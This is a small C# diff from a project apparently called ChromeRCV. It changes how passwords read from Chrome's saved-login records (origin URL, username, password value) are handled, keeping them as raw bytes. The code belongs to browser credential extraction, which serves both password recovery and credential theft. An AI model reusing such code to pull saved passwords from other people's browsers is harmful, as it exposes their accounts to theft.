@@ -85,7 +85,7 @@ namespace ChromeRCV
         {
             string hostname = (string)reader["origin_url"];
             string username = (string)reader["username_value"];
-            string password = Encoding.Default.GetString((byte[])reader["password_value"]);
+            byte[] password = (byte[])reader["password_value"];
 
             ChromiumLogin c = new ChromiumLogin();
             c.Hostname = hostname;
